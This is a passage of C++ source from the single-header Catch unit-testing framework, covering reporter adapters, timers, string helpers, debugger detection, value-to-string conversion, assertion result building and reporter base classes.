		if (assertionStats.assertionResult.getResultType() != ResultWas::Ok) {
			for (std::vector<MessageInfo>::const_iterator it = assertionStats.infoMessages.begin(), itEnd = assertionStats.infoMessages.end();
				it != itEnd;
				++it) {
				if (it->type == ResultWas::Info) {
					ResultBuilder rb(it->macroName.c_str(), it->lineInfo, "", ResultDisposition::Normal);
					rb << it->message;
					rb.setResultType(ResultWas::Info);
					AssertionResult result = rb.build();
					m_legacyReporter->Result(result);
				}
			}
		}
		m_legacyReporter->Result(assertionStats.assertionResult);
		return true;
	}
	void LegacyReporterAdapter::sectionEnded(SectionStats const& sectionStats) {
		if (sectionStats.missingAssertions)
			m_legacyReporter->NoAssertionsInSection(sectionStats.sectionInfo.name);
		m_legacyReporter->EndSection(sectionStats.sectionInfo.name, sectionStats.assertions);
	}
	void LegacyReporterAdapter::testCaseEnded(TestCaseStats const& testCaseStats) {
		m_legacyReporter->EndTestCase
		(testCaseStats.testInfo,
			testCaseStats.totals,
			testCaseStats.stdOut,
			testCaseStats.stdErr);
	}
	void LegacyReporterAdapter::testGroupEnded(TestGroupStats const& testGroupStats) {
		if (testGroupStats.aborting)
			m_legacyReporter->Aborted();
		m_legacyReporter->EndGroup(testGroupStats.groupInfo.name, testGroupStats.totals);
	}
	void LegacyReporterAdapter::testRunEnded(TestRunStats const& testRunStats) {
		m_legacyReporter->EndTesting(testRunStats.totals);
	}
	void LegacyReporterAdapter::skipTest(TestCaseInfo const&) {
	}
}

// #included from: catch_timer.hpp

#ifdef __clang__
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wc++11-long-long"
#endif

#ifdef CATCH_PLATFORM_WINDOWS
#include <windows.h>
#else
#include <sys/time.h>
#endif

namespace Catch {

	namespace {
#ifdef CATCH_PLATFORM_WINDOWS
		uint64_t getCurrentTicks() {
			static uint64_t hz = 0, hzo = 0;
			if (!hz) {
				QueryPerformanceFrequency(reinterpret_cast<LARGE_INTEGER*>(&hz));
				QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&hzo));
			}
			uint64_t t;
			QueryPerformanceCounter(reinterpret_cast<LARGE_INTEGER*>(&t));
			return ((t - hzo) * 1000000) / hz;
		}
#else
		uint64_t getCurrentTicks() {
			timeval t;
			gettimeofday(&t, CATCH_NULL);
			return static_cast<uint64_t>(t.tv_sec) * 1000000ull + static_cast<uint64_t>(t.tv_usec);
		}
#endif
	}

	void Timer::start() {
		m_ticks = getCurrentTicks();
	}
	unsigned int Timer::getElapsedMicroseconds() const {
		return static_cast<unsigned int>(getCurrentTicks() - m_ticks);
	}
	unsigned int Timer::getElapsedMilliseconds() const {
		return static_cast<unsigned int>(getElapsedMicroseconds() / 1000);
	}
	double Timer::getElapsedSeconds() const {
		return getElapsedMicroseconds() / 1000000.0;
	}

} // namespace Catch

#ifdef __clang__
#pragma clang diagnostic pop
#endif
  // #included from: catch_common.hpp
#define TWOBLUECUBES_CATCH_COMMON_HPP_INCLUDED

namespace Catch {

	bool startsWith(std::string const& s, std::string const& prefix) {
		return s.size() >= prefix.size() && s.substr(0, prefix.size()) == prefix;
	}
	bool endsWith(std::string const& s, std::string const& suffix) {
		return s.size() >= suffix.size() && s.substr(s.size() - suffix.size(), suffix.size()) == suffix;
	}
	bool contains(std::string const& s, std::string const& infix) {
		return s.find(infix) != std::string::npos;
	}
	void toLowerInPlace(std::string& s) {
		std::transform(s.begin(), s.end(), s.begin(), ::tolower);
	}
	std::string toLower(std::string const& s) {
		std::string lc = s;
		toLowerInPlace(lc);
		return lc;
	}
	std::string trim(std::string const& str) {
		static char const* whitespaceChars = "\n\r\t ";
		std::string::size_type start = str.find_first_not_of(whitespaceChars);
		std::string::size_type end = str.find_last_not_of(whitespaceChars);

		return start != std::string::npos ? str.substr(start, 1 + end - start) : "";
	}

	bool replaceInPlace(std::string& str, std::string const& replaceThis, std::string const& withThis) {
		bool replaced = false;
		std::size_t i = str.find(replaceThis);
		while (i != std::string::npos) {
			replaced = true;
			str = str.substr(0, i) + withThis + str.substr(i + replaceThis.size());
			if (i < str.size() - withThis.size())
				i = str.find(replaceThis, i + withThis.size());
			else
				i = std::string::npos;
		}
		return replaced;
	}

	pluralise::pluralise(std::size_t count, std::string const& label)
		: m_count(count),
		m_label(label)
	{}

	std::ostream& operator << (std::ostream& os, pluralise const& pluraliser) {
		os << pluraliser.m_count << " " << pluraliser.m_label;
		if (pluraliser.m_count != 1)
			os << "s";
		return os;
	}

	SourceLineInfo::SourceLineInfo() : line(0) {}
	SourceLineInfo::SourceLineInfo(char const* _file, std::size_t _line)
		: file(_file),
		line(_line)
	{}
	SourceLineInfo::SourceLineInfo(SourceLineInfo const& other)
		: file(other.file),
		line(other.line)
	{}
	bool SourceLineInfo::empty() const {
		return file.empty();
	}
	bool SourceLineInfo::operator == (SourceLineInfo const& other) const {
		return line == other.line && file == other.file;
	}
	bool SourceLineInfo::operator < (SourceLineInfo const& other) const {
		return line < other.line || (line == other.line  && file < other.file);
	}

	void seedRng(IConfig const& config) {
		if (config.rngSeed() != 0)
			std::srand(config.rngSeed());
	}
	unsigned int rngSeed() {
		return getCurrentContext().getConfig()->rngSeed();
	}

	std::ostream& operator << (std::ostream& os, SourceLineInfo const& info) {
#ifndef __GNUG__
		os << info.file << "(" << info.line << ")";
#else
		os << info.file << ":" << info.line;
#endif
		return os;
	}

	void throwLogicError(std::string const& message, SourceLineInfo const& locationInfo) {
		std::ostringstream oss;
		oss << locationInfo << ": Internal Catch error: '" << message << "'";
		if (alwaysTrue())
			throw std::logic_error(oss.str());
	}
}

// #included from: catch_section.hpp
#define TWOBLUECUBES_CATCH_SECTION_HPP_INCLUDED

namespace Catch {

	SectionInfo::SectionInfo
	(SourceLineInfo const& _lineInfo,
		std::string const& _name,
		std::string const& _description)
		: name(_name),
		description(_description),
		lineInfo(_lineInfo)
	{}

	Section::Section(SectionInfo const& info)
		: m_info(info),
		m_sectionIncluded(getResultCapture().sectionStarted(m_info, m_assertions))
	{
		m_timer.start();
	}

	Section::~Section() {
		if (m_sectionIncluded) {
			SectionEndInfo endInfo(m_info, m_assertions, m_timer.getElapsedSeconds());
			if (std::uncaught_exception())
				getResultCapture().sectionEndedEarly(endInfo);
			else
				getResultCapture().sectionEnded(endInfo);
		}
	}

	// This indicates whether the section should be executed or not
	Section::operator bool() const {
		return m_sectionIncluded;
	}

} // end namespace Catch

  // #included from: catch_debugger.hpp
#define TWOBLUECUBES_CATCH_DEBUGGER_HPP_INCLUDED

#include <iostream>

#ifdef CATCH_PLATFORM_MAC

#include <assert.h>
#include <stdbool.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/sysctl.h>

namespace Catch {

	// The following function is taken directly from the following technical note:
	// http://developer.apple.com/library/mac/#qa/qa2004/qa1361.html

	// Returns true if the current process is being debugged (either
	// running under the debugger or has a debugger attached post facto).
	bool isDebuggerActive() {

		int                 mib[4];
		struct kinfo_proc   info;
		size_t              size;

		// Initialize the flags so that, if sysctl fails for some bizarre
		// reason, we get a predictable result.

		info.kp_proc.p_flag = 0;

		// Initialize mib, which tells sysctl the info we want, in this case
		// we're looking for information about a specific process ID.

		mib[0] = CTL_KERN;
		mib[1] = KERN_PROC;
		mib[2] = KERN_PROC_PID;
		mib[3] = getpid();

		// Call sysctl.

		size = sizeof(info);
		if (sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, CATCH_NULL, 0) != 0) {
			Catch::cerr() << "\n** Call to sysctl failed - unable to determine if debugger is active **\n" << std::endl;
			return false;
		}

		// We're being debugged if the P_TRACED flag is set.

		return ((info.kp_proc.p_flag & P_TRACED) != 0);
	}
} // namespace Catch

#elif defined(_MSC_VER)
extern "C" __declspec(dllimport) int __stdcall IsDebuggerPresent();
namespace Catch {
	bool isDebuggerActive() {
		return IsDebuggerPresent() != 0;
	}
}
#elif defined(__MINGW32__)
extern "C" __declspec(dllimport) int __stdcall IsDebuggerPresent();
namespace Catch {
	bool isDebuggerActive() {
		return IsDebuggerPresent() != 0;
	}
}
#else
namespace Catch {
	inline bool isDebuggerActive() { return false; }
}
#endif // Platform

#ifdef CATCH_PLATFORM_WINDOWS
extern "C" __declspec(dllimport) void __stdcall OutputDebugStringA(const char*);
namespace Catch {
	void writeToDebugConsole(std::string const& text) {
		::OutputDebugStringA(text.c_str());
	}
}
#else
namespace Catch {
	void writeToDebugConsole(std::string const& text) {
		// !TBD: Need a version for Mac/ XCode and other IDEs
		Catch::cout() << text;
	}
}
#endif // Platform

// #included from: catch_tostring.hpp
#define TWOBLUECUBES_CATCH_TOSTRING_HPP_INCLUDED

namespace Catch {

	namespace Detail {

		const std::string unprintableString = "{?}";

		namespace {
			const int hexThreshold = 255;

			struct Endianness {
				enum Arch { Big, Little };

				static Arch which() {
					union _ {
						int asInt;
						char asChar[sizeof(int)];
					} u;

					u.asInt = 1;
					return (u.asChar[sizeof(int) - 1] == 1) ? Big : Little;
				}
			};
		}

		std::string rawMemoryToString(const void *object, std::size_t size)
		{
			// Reverse order for little endian architectures
			int i = 0, end = static_cast<int>(size), inc = 1;
			if (Endianness::which() == Endianness::Little) {
				i = end - 1;
				end = inc = -1;
			}

			unsigned char const *bytes = static_cast<unsigned char const *>(object);
			std::ostringstream os;
			os << "0x" << std::setfill('0') << std::hex;
			for (; i != end; i += inc)
				os << std::setw(2) << static_cast<unsigned>(bytes[i]);
			return os.str();
		}
	}

	std::string toString(std::string const& value) {
		std::string s = value;
		if (getCurrentContext().getConfig()->showInvisibles()) {
			for (size_t i = 0; i < s.size(); ++i) {
				std::string subs;
				switch (s[i]) {
				case '\n': subs = "\\n"; break;
				case '\t': subs = "\\t"; break;
				default: break;
				}
				if (!subs.empty()) {
					s = s.substr(0, i) + subs + s.substr(i + 1);
					++i;
				}
			}
		}
		return "\"" + s + "\"";
	}
	std::string toString(std::wstring const& value) {

		std::string s;
		s.reserve(value.size());
		for (size_t i = 0; i < value.size(); ++i)
			s += value[i] <= 0xff ? static_cast<char>(value[i]) : '?';
		return Catch::toString(s);
	}

	std::string toString(const char* const value) {
		return value ? Catch::toString(std::string(value)) : std::string("{null string}");
	}

	std::string toString(char* const value) {
		return Catch::toString(static_cast<const char*>(value));
	}

	std::string toString(const wchar_t* const value)
	{
		return value ? Catch::toString(std::wstring(value)) : std::string("{null string}");
	}

	std::string toString(wchar_t* const value)
	{
		return Catch::toString(static_cast<const wchar_t*>(value));
	}

	std::string toString(int value) {
		std::ostringstream oss;
		oss << value;
		if (value > Detail::hexThreshold)
			oss << " (0x" << std::hex << value << ")";
		return oss.str();
	}

	std::string toString(unsigned long value) {
		std::ostringstream oss;
		oss << value;
		if (value > Detail::hexThreshold)
			oss << " (0x" << std::hex << value << ")";
		return oss.str();
	}

	std::string toString(unsigned int value) {
		return Catch::toString(static_cast<unsigned long>(value));
	}

	template<typename T>
	std::string fpToString(T value, int precision) {
		std::ostringstream oss;
		oss << std::setprecision(precision)
			<< std::fixed
			<< value;
		std::string d = oss.str();
		std::size_t i = d.find_last_not_of('0');
		if (i != std::string::npos && i != d.size() - 1) {
			if (d[i] == '.')
				i++;
			d = d.substr(0, i + 1);
		}
		return d;
	}

	std::string toString(const double value) {
		return fpToString(value, 10);
	}
	std::string toString(const float value) {
		return fpToString(value, 5) + "f";
	}

	std::string toString(bool value) {
		return value ? "true" : "false";
	}

	std::string toString(char value) {
		return value < ' '
			? toString(static_cast<unsigned int>(value))
			: Detail::makeString(value);
	}

	std::string toString(signed char value) {
		return toString(static_cast<char>(value));
	}

	std::string toString(unsigned char value) {
		return toString(static_cast<char>(value));
	}

#ifdef CATCH_CONFIG_CPP11_LONG_LONG
	std::string toString(long long value) {
		std::ostringstream oss;
		oss << value;
		if (value > Detail::hexThreshold)
			oss << " (0x" << std::hex << value << ")";
		return oss.str();
	}
	std::string toString(unsigned long long value) {
		std::ostringstream oss;
		oss << value;
		if (value > Detail::hexThreshold)
			oss << " (0x" << std::hex << value << ")";
		return oss.str();
	}
#endif

#ifdef CATCH_CONFIG_CPP11_NULLPTR
	std::string toString(std::nullptr_t) {
		return "nullptr";
	}
#endif

#ifdef __OBJC__
	std::string toString(NSString const * const& nsstring) {
		if (!nsstring)
			return "nil";
		return "@" + toString([nsstring UTF8String]);
	}
	std::string toString(NSString * CATCH_ARC_STRONG const& nsstring) {
		if (!nsstring)
			return "nil";
		return "@" + toString([nsstring UTF8String]);
	}
	std::string toString(NSObject* const& nsObject) {
		return toString([nsObject description]);
	}
#endif

} // end namespace Catch

  // #included from: catch_result_builder.hpp
#define TWOBLUECUBES_CATCH_RESULT_BUILDER_HPP_INCLUDED

namespace Catch {

	std::string capturedExpressionWithSecondArgument(std::string const& capturedExpression, std::string const& secondArg) {
		return secondArg.empty() || secondArg == "\"\""
			? capturedExpression
			: capturedExpression + ", " + secondArg;
	}
	ResultBuilder::ResultBuilder(char const* macroName,
		SourceLineInfo const& lineInfo,
		char const* capturedExpression,
		ResultDisposition::Flags resultDisposition,
		char const* secondArg)
		: m_assertionInfo(macroName, lineInfo, capturedExpressionWithSecondArgument(capturedExpression, secondArg), resultDisposition),
		m_shouldDebugBreak(false),
		m_shouldThrow(false)
	{}

	ResultBuilder& ResultBuilder::setResultType(ResultWas::OfType result) {
		m_data.resultType = result;
		return *this;
	}
	ResultBuilder& ResultBuilder::setResultType(bool result) {
		m_data.resultType = result ? ResultWas::Ok : ResultWas::ExpressionFailed;
		return *this;
	}
	ResultBuilder& ResultBuilder::setLhs(std::string const& lhs) {
		m_exprComponents.lhs = lhs;
		return *this;
	}
	ResultBuilder& ResultBuilder::setRhs(std::string const& rhs) {
		m_exprComponents.rhs = rhs;
		return *this;
	}
	ResultBuilder& ResultBuilder::setOp(std::string const& op) {
		m_exprComponents.op = op;
		return *this;
	}

	void ResultBuilder::endExpression() {
		m_exprComponents.testFalse = isFalseTest(m_assertionInfo.resultDisposition);
		captureExpression();
	}

	void ResultBuilder::useActiveException(ResultDisposition::Flags resultDisposition) {
		m_assertionInfo.resultDisposition = resultDisposition;
		m_stream.oss << Catch::translateActiveException();
		captureResult(ResultWas::ThrewException);
	}

	void ResultBuilder::captureResult(ResultWas::OfType resultType) {
		setResultType(resultType);
		captureExpression();
	}
	void ResultBuilder::captureExpectedException(std::string const& expectedMessage) {
		if (expectedMessage.empty())
			captureExpectedException(Matchers::Impl::Generic::AllOf<std::string>());
		else
			captureExpectedException(Matchers::Equals(expectedMessage));
	}

	void ResultBuilder::captureExpectedException(Matchers::Impl::Matcher<std::string> const& matcher) {

		assert(m_exprComponents.testFalse == false);
		AssertionResultData data = m_data;
		data.resultType = ResultWas::Ok;
		data.reconstructedExpression = m_assertionInfo.capturedExpression;

		std::string actualMessage = Catch::translateActiveException();
		if (!matcher.match(actualMessage)) {
			data.resultType = ResultWas::ExpressionFailed;
			data.reconstructedExpression = actualMessage;
		}
		AssertionResult result(m_assertionInfo, data);
		handleResult(result);
	}

	void ResultBuilder::captureExpression() {
		AssertionResult result = build();
		handleResult(result);
	}
	void ResultBuilder::handleResult(AssertionResult const& result)
	{
		getResultCapture().assertionEnded(result);

		if (!result.isOk()) {
			if (getCurrentContext().getConfig()->shouldDebugBreak())
				m_shouldDebugBreak = true;
			if (getCurrentContext().getRunner()->aborting() || (m_assertionInfo.resultDisposition & ResultDisposition::Normal))
				m_shouldThrow = true;
		}
	}
	void ResultBuilder::react() {
		if (m_shouldThrow)
			throw Catch::TestFailureException();
	}

	bool ResultBuilder::shouldDebugBreak() const { return m_shouldDebugBreak; }
	bool ResultBuilder::allowThrows() const { return getCurrentContext().getConfig()->allowThrows(); }

	AssertionResult ResultBuilder::build() const
	{
		assert(m_data.resultType != ResultWas::Unknown);

		AssertionResultData data = m_data;

		// Flip bool results if testFalse is set
		if (m_exprComponents.testFalse) {
			if (data.resultType == ResultWas::Ok)
				data.resultType = ResultWas::ExpressionFailed;
			else if (data.resultType == ResultWas::ExpressionFailed)
				data.resultType = ResultWas::Ok;
		}

		data.message = m_stream.oss.str();
		data.reconstructedExpression = reconstructExpression();
		if (m_exprComponents.testFalse) {
			if (m_exprComponents.op == "")
				data.reconstructedExpression = "!" + data.reconstructedExpression;
			else
				data.reconstructedExpression = "!(" + data.reconstructedExpression + ")";
		}
		return AssertionResult(m_assertionInfo, data);
	}
	std::string ResultBuilder::reconstructExpression() const {
		if (m_exprComponents.op == "")
			return m_exprComponents.lhs.empty() ? m_assertionInfo.capturedExpression : m_exprComponents.op + m_exprComponents.lhs;
		else if (m_exprComponents.op == "matches")
			return m_exprComponents.lhs + " " + m_exprComponents.rhs;
		else if (m_exprComponents.op != "!") {
			if (m_exprComponents.lhs.size() + m_exprComponents.rhs.size() < 40 &&
				m_exprComponents.lhs.find("\n") == std::string::npos &&
				m_exprComponents.rhs.find("\n") == std::string::npos)
				return m_exprComponents.lhs + " " + m_exprComponents.op + " " + m_exprComponents.rhs;
			else
				return m_exprComponents.lhs + "\n" + m_exprComponents.op + "\n" + m_exprComponents.rhs;
		}
		else
			return "{can't expand - use " + m_assertionInfo.macroName + "_FALSE( " + m_assertionInfo.capturedExpression.substr(1) + " ) instead of " + m_assertionInfo.macroName + "( " + m_assertionInfo.capturedExpression + " ) for better diagnostics}";
	}

} // end namespace Catch

  // #included from: catch_tag_alias_registry.hpp
#define TWOBLUECUBES_CATCH_TAG_ALIAS_REGISTRY_HPP_INCLUDED

  // #included from: catch_tag_alias_registry.h
#define TWOBLUECUBES_CATCH_TAG_ALIAS_REGISTRY_H_INCLUDED

#include <map>

namespace Catch {

	class TagAliasRegistry : public ITagAliasRegistry {
	public:
		virtual ~TagAliasRegistry();
		virtual Option<TagAlias> find(std::string const& alias) const;
		virtual std::string expandAliases(std::string const& unexpandedTestSpec) const;
		void add(char const* alias, char const* tag, SourceLineInfo const& lineInfo);
		static TagAliasRegistry& get();

	private:
		std::map<std::string, TagAlias> m_registry;
	};

} // end namespace Catch

#include <map>
#include <iostream>

namespace Catch {

	TagAliasRegistry::~TagAliasRegistry() {}

	Option<TagAlias> TagAliasRegistry::find(std::string const& alias) const {
		std::map<std::string, TagAlias>::const_iterator it = m_registry.find(alias);
		if (it != m_registry.end())
			return it->second;
		else
			return Option<TagAlias>();
	}

	std::string TagAliasRegistry::expandAliases(std::string const& unexpandedTestSpec) const {
		std::string expandedTestSpec = unexpandedTestSpec;
		for (std::map<std::string, TagAlias>::const_iterator it = m_registry.begin(), itEnd = m_registry.end();
			it != itEnd;
			++it) {
			std::size_t pos = expandedTestSpec.find(it->first);
			if (pos != std::string::npos) {
				expandedTestSpec = expandedTestSpec.substr(0, pos) +
					it->second.tag +
					expandedTestSpec.substr(pos + it->first.size());
			}
		}
		return expandedTestSpec;
	}

	void TagAliasRegistry::add(char const* alias, char const* tag, SourceLineInfo const& lineInfo) {

		if (!startsWith(alias, "[@") || !endsWith(alias, "]")) {
			std::ostringstream oss;
			oss << "error: tag alias, \"" << alias << "\" is not of the form [@alias name].\n" << lineInfo;
			throw std::domain_error(oss.str().c_str());
		}
		if (!m_registry.insert(std::make_pair(alias, TagAlias(tag, lineInfo))).second) {
			std::ostringstream oss;
			oss << "error: tag alias, \"" << alias << "\" already registered.\n"
				<< "\tFirst seen at " << find(alias)->lineInfo << "\n"
				<< "\tRedefined at " << lineInfo;
			throw std::domain_error(oss.str().c_str());
		}
	}

	TagAliasRegistry& TagAliasRegistry::get() {
		static TagAliasRegistry instance;
		return instance;

	}

	ITagAliasRegistry::~ITagAliasRegistry() {}
	ITagAliasRegistry const& ITagAliasRegistry::get() { return TagAliasRegistry::get(); }

	RegistrarForTagAliases::RegistrarForTagAliases(char const* alias, char const* tag, SourceLineInfo const& lineInfo) {
		try {
			TagAliasRegistry::get().add(alias, tag, lineInfo);
		}
		catch (std::exception& ex) {
			Colour colourGuard(Colour::Red);
			Catch::cerr() << ex.what() << std::endl;
			exit(1);
		}
	}

} // end namespace Catch

  // #included from: ../reporters/catch_reporter_multi.hpp
#define TWOBLUECUBES_CATCH_REPORTER_MULTI_HPP_INCLUDED

namespace Catch {

	class MultipleReporters : public SharedImpl<IStreamingReporter> {
		typedef std::vector<Ptr<IStreamingReporter> > Reporters;
		Reporters m_reporters;

	public:
		void add(Ptr<IStreamingReporter> const& reporter) {
			m_reporters.push_back(reporter);
		}

	public: // IStreamingReporter

		virtual ReporterPreferences getPreferences() const CATCH_OVERRIDE {
			return m_reporters[0]->getPreferences();
		}

		virtual void noMatchingTestCases(std::string const& spec) CATCH_OVERRIDE {
			for (Reporters::const_iterator it = m_reporters.begin(), itEnd = m_reporters.end();
				it != itEnd;
				++it)
				(*it)->noMatchingTestCases(spec);
		}

		virtual void testRunStarting(TestRunInfo const& testRunInfo) CATCH_OVERRIDE {
			for (Reporters::const_iterator it = m_reporters.begin(), itEnd = m_reporters.end();
				it != itEnd;
				++it)
				(*it)->testRunStarting(testRunInfo);
		}

		virtual void testGroupStarting(GroupInfo const& groupInfo) CATCH_OVERRIDE {
			for (Reporters::const_iterator it = m_reporters.begin(), itEnd = m_reporters.end();
				it != itEnd;
				++it)
				(*it)->testGroupStarting(groupInfo);
		}

		virtual void testCaseStarting(TestCaseInfo const& testInfo) CATCH_OVERRIDE {
			for (Reporters::const_iterator it = m_reporters.begin(), itEnd = m_reporters.end();
				it != itEnd;
				++it)
				(*it)->testCaseStarting(testInfo);
		}

		virtual void sectionStarting(SectionInfo const& sectionInfo) CATCH_OVERRIDE {
			for (Reporters::const_iterator it = m_reporters.begin(), itEnd = m_reporters.end();
				it != itEnd;
				++it)
				(*it)->sectionStarting(sectionInfo);
		}

		virtual void assertionStarting(AssertionInfo const& assertionInfo) CATCH_OVERRIDE {
			for (Reporters::const_iterator it = m_reporters.begin(), itEnd = m_reporters.end();
				it != itEnd;
				++it)
				(*it)->assertionStarting(assertionInfo);
		}

		// The return value indicates if the messages buffer should be cleared:
		virtual bool assertionEnded(AssertionStats const& assertionStats) CATCH_OVERRIDE {
			bool clearBuffer = false;
			for (Reporters::const_iterator it = m_reporters.begin(), itEnd = m_reporters.end();
				it != itEnd;
				++it)
				clearBuffer |= (*it)->assertionEnded(assertionStats);
			return clearBuffer;
		}

		virtual void sectionEnded(SectionStats const& sectionStats) CATCH_OVERRIDE {
			for (Reporters::const_iterator it = m_reporters.begin(), itEnd = m_reporters.end();
				it != itEnd;
				++it)
				(*it)->sectionEnded(sectionStats);
		}

		virtual void testCaseEnded(TestCaseStats const& testCaseStats) CATCH_OVERRIDE {
			for (Reporters::const_iterator it = m_reporters.begin(), itEnd = m_reporters.end();
				it != itEnd;
				++it)
				(*it)->testCaseEnded(testCaseStats);
		}

		virtual void testGroupEnded(TestGroupStats const& testGroupStats) CATCH_OVERRIDE {
			for (Reporters::const_iterator it = m_reporters.begin(), itEnd = m_reporters.end();
				it != itEnd;
				++it)
				(*it)->testGroupEnded(testGroupStats);
		}

		virtual void testRunEnded(TestRunStats const& testRunStats) CATCH_OVERRIDE {
			for (Reporters::const_iterator it = m_reporters.begin(), itEnd = m_reporters.end();
				it != itEnd;
				++it)
				(*it)->testRunEnded(testRunStats);
		}

		virtual void skipTest(TestCaseInfo const& testInfo) CATCH_OVERRIDE {
			for (Reporters::const_iterator it = m_reporters.begin(), itEnd = m_reporters.end();
				it != itEnd;
				++it)
				(*it)->skipTest(testInfo);
		}

		virtual MultipleReporters* tryAsMulti() CATCH_OVERRIDE {
			return this;
		}

	};

	Ptr<IStreamingReporter> addReporter(Ptr<IStreamingReporter> const& existingReporter, Ptr<IStreamingReporter> const& additionalReporter) {
		Ptr<IStreamingReporter> resultingReporter;

		if (existingReporter) {
			MultipleReporters* multi = existingReporter->tryAsMulti();
			if (!multi) {
				multi = new MultipleReporters;
				resultingReporter = Ptr<IStreamingReporter>(multi);
				if (existingReporter)
					multi->add(existingReporter);
			}
			else
				resultingReporter = existingReporter;
			multi->add(additionalReporter);
		}
		else
			resultingReporter = additionalReporter;

		return resultingReporter;
	}

} // end namespace Catch

  // #included from: ../reporters/catch_reporter_xml.hpp
#define TWOBLUECUBES_CATCH_REPORTER_XML_HPP_INCLUDED

  // #included from: catch_reporter_bases.hpp
#define TWOBLUECUBES_CATCH_REPORTER_BASES_HPP_INCLUDED

#include <cstring>

namespace Catch {

	struct StreamingReporterBase : SharedImpl<IStreamingReporter> {

		StreamingReporterBase(ReporterConfig const& _config)
			: m_config(_config.fullConfig()),
			stream(_config.stream())
		{
			m_reporterPrefs.shouldRedirectStdOut = false;
		}

		virtual ReporterPreferences getPreferences() const CATCH_OVERRIDE {
			return m_reporterPrefs;
		}

		virtual ~StreamingReporterBase() CATCH_OVERRIDE;

		virtual void noMatchingTestCases(std::string const&) CATCH_OVERRIDE {}

		virtual void testRunStarting(TestRunInfo const& _testRunInfo) CATCH_OVERRIDE {
			currentTestRunInfo = _testRunInfo;
		}
		virtual void testGroupStarting(GroupInfo const& _groupInfo) CATCH_OVERRIDE {
			currentGroupInfo = _groupInfo;
		}

		virtual void testCaseStarting(TestCaseInfo const& _testInfo) CATCH_OVERRIDE {
			currentTestCaseInfo = _testInfo;
		}
		virtual void sectionStarting(SectionInfo const& _sectionInfo) CATCH_OVERRIDE {
			m_sectionStack.push_back(_sectionInfo);
		}

		virtual void sectionEnded(SectionStats const& /* _sectionStats */) CATCH_OVERRIDE {
			m_sectionStack.pop_back();
		}
		virtual void testCaseEnded(TestCaseStats const& /* _testCaseStats */) CATCH_OVERRIDE {
			currentTestCaseInfo.reset();
		}
		virtual void testGroupEnded(TestGroupStats const& /* _testGroupStats */) CATCH_OVERRIDE {
			currentGroupInfo.reset();
		}
		virtual void testRunEnded(TestRunStats const& /* _testRunStats */) CATCH_OVERRIDE {
			currentTestCaseInfo.reset();
			currentGroupInfo.reset();
			currentTestRunInfo.reset();
		}

		virtual void skipTest(TestCaseInfo const&) CATCH_OVERRIDE {
			// Don't do anything with this by default.
			// It can optionally be overridden in the derived class.
		}

		Ptr<IConfig const> m_config;
		std::ostream& stream;

		LazyStat<TestRunInfo> currentTestRunInfo;
		LazyStat<GroupInfo> currentGroupInfo;
		LazyStat<TestCaseInfo> currentTestCaseInfo;

		std::vector<SectionInfo> m_sectionStack;
		ReporterPreferences m_reporterPrefs;
	};

	struct CumulativeReporterBase : SharedImpl<IStreamingReporter> {
		template<typename T, typename ChildNodeT>
		struct Node : SharedImpl<> {
			explicit Node(T const& _value) : value(_value) {}
			virtual ~Node() {}

			typedef std::vector<Ptr<ChildNodeT> > ChildNodes;
			T value;
			ChildNodes children;
		};
		struct SectionNode : SharedImpl<> {
			explicit SectionNode(SectionStats const& _stats) : stats(_stats) {}
			virtual ~SectionNode();

			bool operator == (SectionNode const& other) const {
				return stats.sectionInfo.lineInfo == other.stats.sectionInfo.lineInfo;
			}
			bool operator == (Ptr<SectionNode> const& other) const {
				return operator==(*other);
			}

			SectionStats stats;
			typedef std::vector<Ptr<SectionNode> > ChildSections;
			typedef std::vector<AssertionStats> Assertions;
			ChildSections childSections;
			Assertions assertions;
			std::string stdOut;
			std::string stdErr;
		};

		struct BySectionInfo {
			BySectionInfo(SectionInfo const& other) : m_other(other) {}
			BySectionInfo(BySectionInfo const& other) : m_other(other.m_other) {}
			bool operator() (Ptr<SectionNode> const& node) const {
				return node->stats.sectionInfo.lineInfo == m_other.lineInfo;
			}
		private:
			void operator=(BySectionInfo const&);
			SectionInfo const& m_other;
		};

		typedef Node<TestCaseStats, SectionNode> TestCaseNode;
		typedef Node<TestGroupStats, TestCaseNode> TestGroupNode;
		typedef Node<TestRunStats, TestGroupNode> TestRunNode;

		CumulativeReporterBase(ReporterConfig const& _config)
			: m_config(_config.fullConfig()),
			stream(_config.stream())
		{
			m_reporterPrefs.shouldRedirectStdOut = false;
		}
		~CumulativeReporterBase();

		virtual ReporterPreferences getPreferences() const CATCH_OVERRIDE {
			return m_reporterPrefs;
		}

		virtual void testRunStarting(TestRunInfo const&) CATCH_OVERRIDE {}
		virtual void testGroupStarting(GroupInfo const&) CATCH_OVERRIDE {}

		virtual void testCaseStarting(TestCaseInfo const&) CATCH_OVERRIDE {}

		virtual void sectionStarting(SectionInfo const& sectionInfo) CATCH_OVERRIDE {
			SectionStats incompleteStats(sectionInfo, Counts(), 0, false);
			Ptr<SectionNode> node;
			if (m_sectionStack.empty()) {
				if (!m_rootSection)
					m_rootSection = new SectionNode(incompleteStats);
				node = m_rootSection;
			}
			else {
				SectionNode& parentNode = *m_sectionStack.back();
				SectionNode::ChildSections::const_iterator it =
					std::find_if(parentNode.childSections.begin(),
						parentNode.childSections.end(),
						BySectionInfo(sectionInfo));
				if (it == parentNode.childSections.end()) {
					node = new SectionNode(incompleteStats);
					parentNode.childSections.push_back(node);
				}
				else
					node = *it;
			}
			m_sectionStack.push_back(node);
			m_deepestSection = node;
		}

		virtual void assertionStarting(AssertionInfo const&) CATCH_OVERRIDE {}

		virtual bool assertionEnded(AssertionStats const& assertionStats) CATCH_OVERRIDE {
			assert(!m_sectionStack.empty());
			SectionNode& sectionNode = *m_sectionStack.back();
			sectionNode.assertions.push_back(assertionStats);
			return true;
		}
		virtual void sectionEnded(SectionStats const& sectionStats) CATCH_OVERRIDE {
			assert(!m_sectionStack.empty());
			SectionNode& node = *m_sectionStack.back();
			node.stats = sectionStats;
			m_sectionStack.pop_back();
		}
		virtual void testCaseEnded(TestCaseStats const& testCaseStats) CATCH_OVERRIDE {
			Ptr<TestCaseNode> node = new TestCaseNode(testCaseStats);
			assert(m_sectionStack.size() == 0);
			node->children.push_back(m_rootSection);
			m_testCases.push_back(node);
			m_rootSection.reset();

			assert(m_deepestSection);
			m_deepestSection->stdOut = testCaseStats.stdOut;
			m_deepestSection->stdErr = testCaseStats.stdErr;
		}
